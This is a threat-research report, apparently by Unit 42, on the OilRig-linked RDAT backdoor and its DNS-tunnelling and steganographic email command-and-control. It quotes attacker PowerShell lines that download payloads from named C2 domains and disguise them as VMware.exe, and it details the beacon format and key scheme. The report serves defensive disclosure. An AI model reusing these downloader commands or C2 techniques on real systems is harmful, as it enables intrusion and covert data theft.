@@ -1,0 +1,59 @@
+While analyzing an attack against a Middle Eastern telecommunications organization, we discovered a variant of an OilRig-associated tool we call RDAT using a novel email-based command and control (C2) channel that relied on a technique known as steganography to hide commands and data within bitmap images attached to emails.
+In May 2020, Symantec published research on the Greenbug group targeting telecommunications organizations in Southeast Asia, involving attacks made as recently as April 2020.
+We observed similar tactics and tools associated with attacks on a telecommunications organization in the Middle East in April 2020, specifically using custom Mimikatz tools, Bitvise, PowerShell downloaders and a custom backdoor we track as RDAT.
+Unit 42 has previously linked Greenbug to OilRig, a threat group we discovered in 2015.
+We had first seen the RDAT tool used in OilRig’s operations back in 2017, but we later found a related sample created in 2018 that used a different command and control channel.
+When we analyzed this sample, we found a novel email-based C2 channel used in combination with steganography to exfiltrate data.
+We have been tracking RDAT since 2017, when we first saw this tool uploaded to a webshell related to the TwoFace webshell discussed in our Striking Oil blog published on September 26, 2017.
+RDAT has been under active development since 2017, resulting in multiple variations of the tool that rely on both HTTP and DNS tunneling for C2 communications.
+In June 2018, the developer of RDAT added the ability to use Exchange Web Services (EWS) to send and receive emails for C2 communications.
+This email-based C2 channel is novel in its design, as it relies on steganography to hide commands and exfiltrates data within BMP images attached to the emails.
+The combination of using emails with steganographic images to carry the data across the C2 can result in this activity being much more difficult to detect and allow for higher chances of defense evasion.
+Palo Alto Networks customers are protected by WildFire and Cortex XDR, which identifies all RDAT samples as malicious, as well as DNS Security and URL Filtering, which identifies and blocks the C2 activity.
+We first discovered the existence of RDAT on October 7, 2017, when we observed it being uploaded to a webshell 11 days after we had published our research exposing webshell activity by this adversary.
+We believe the group attempted to use the RDAT payload for continued access to the server once the use of the webshell was exposed.
+In April 2020, we observed activity involving the potential breach of a telecommunications organization in the Middle East.
+The files associated with this activity included custom Mimikatz samples for dumping credentials, a sample of the Bitvise client we believe was used to create SSH tunnels, and a custom backdoor called RDAT.
+From the initial RDAT sample we collected, we were able to expand the sample set and relate previously seen ISMDOOR samples as well.
+Given the combination of the use of RDAT in OilRig-related webshells, code similarities and tactical similarities, we are confident RDAT is a tool deployed by OilRig.
+Two of the related tools collected had PDB paths similar to ones we had seen in the past.
+The PDB paths were C:\Users\Void\Desktop\dns\client\x64\Release\client.pdb and C:\Users\Void\Desktop\RDAT\client\x64\Release\client.pdb, the latter of which is the basis of the tool name.
+Using the file path of the user in the PDB string of C:\Users\Void\Desktop as shown in Figure 1, we gathered over a dozen samples with that file path, with most of the samples identified as a known OilRig tool called ISMDOOR.
+Considering the small cluster of related tools, it is highly likely these have been developed by a single adversary or adversary group with control over the codebase.
+Figure 1.
+Pivots from PDB strings
+We also observed PowerShell downloaders attempting to retrieve files from the domain digi.shanx.icu.
+Figure 2.
+PowerShell and infrastructure overlaps
+In Symantec’s Greenbug report, once the adversary gained interactive access to target hosts, they were observed executing PowerShell commands to perform post-exploitation activities.
+In one instance, a Powershell script was executed to retrieve RDAT from the C2 apps.vvvnews.com, save it to C:\Programdata\Nt.dat, and move it to C:\Programdata\Vmware\VMware.exe as seen in the following snippet:
+(New-Object System.Net.WebClient).DownloadFile(‘http://apps.vvvnews .com:8080/Yf.dat’, ‘C:\Programdata\Nt.dat’);
+move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe -force;
+During our research, we collected a very similar PowerShell script using a different C2 and with some variations in commands, but with the same file path of C:\Programdata\Nt.dat:
+$WebClient = New-Object System.Net.WebClient; $WebProxy = New-Object System.Net.WebProxy(‘http://192.168.3.4:8080’,$true); $WebClient.Proxy = $WebProxy;Try {$WebClient.DownloadFile(‘http://digi.shanx.icu:8080/Nt.dat’,’C:\Programdata\Nt.dat’)} Catch {$_.Exception.Message | out-file C:\Programdata\Exceptions.dat};
+Unfortunately, we could not verify the contents of Nt.dat due to the C2 server http://digi.shanx.icu:8080 being unavailable at the time of analysis.
+The adversaries compiled the RDAT payloads used in the attacks on the Middle Eastern telecommunications organization on March 1, 2020, and configured it to use a domain provided on the command line or the hardcoded domain rsshay.com as its C2 server.
+Unlike previous RDAT samples, this particular sample only uses DNS tunneling for its C2 communications with no HTTP fallback channel.
+This RDAT sample can only use TXT queries in its DNS tunnel and will issue queries structured like the following:
+<encoded data>.<encoding method, 0 for base64 or 1 for base32><encryption key>.<C2 domain>
+The encoded data portion of the subdomain is encoded base32 if the actor includes a command line argument 1 – otherwise, it uses base64.
+The payload also substitutes characters within the base64 encoded subdomain to avoid including characters that are not allowed in domain names, such as = with -, / with _ and + with -a.
+For example, we observed the following beacon during our testing:
+91mzXgXT-a9sLktr-aOz8pAw–.0R2.rsshay.com
+The encoded data in the beacon (subdomain) is ciphertext generated using AES and a 16-byte key generated by concatenating two randomly chosen alphanumeric characters that are also present in the subdomain immediately before the C2 domain.
+For instance, if the two random alphanumeric characters included in the subdomain were R2, the payload would use the string R2R2R2R2R2R2R2R2 as a key to encrypt the data.
+The example beacon above would decrypt to 1,6,1.0_Y,2619, which is structured as follows:
+<communications type value>,<ID value from config>,<hardcoded payload version>,<randomly generated number>
+The payload decodes the response for an answer to the TXT query with base64 and decrypts using the same AES cipher and key as the request.
+The payload attempts to parse the decrypted cleartext using the regular expression “[^,]+” to get the command value and the command arguments that are split with a comma.
+The payload then checks the command value using a command handler that has the ability to execute commands and upload and download files, as seen in Table 1.
+Table 1.
+Commands available in RDAT
+During our research, we gathered several additional samples by pivoting on the contents of the executables and other various attributes.
+Table 2 shows when these samples were compiled, their respective C2 server and the service name they use when the actor installs them on the compromised system.
+As shown by the compilation times, this tool has been in development since 2017, with the most recent sample we collected being compiled in April 2020.
+The sample compiled in August 2017 was uploaded to a webshell related to TwoFace, while the samples compiled in March 2020 were used in the attack on the Middle Eastern telecommunications organization.
+The RDAT sample compiled in April 2020 was also delivered to the same telecommunications organization, which was configured to use new infrastructure (sharjatv.com, wwmal.com) and supported both DNS A and AAAA records for its DNS tunneling C2 channel.
+The most interesting sample we discovered was compiled on July 24, 2018.
+This sample included a novel C2 channel that used the Exchange Web Services (EWS) API to send and receive emails containing steganographic images as attachments.
+This novel C2 channel supplemented the HTTP and DNS tunneling C2 channels seen in other RDAT samples, all of which we will discuss in detail in the upcoming sections.
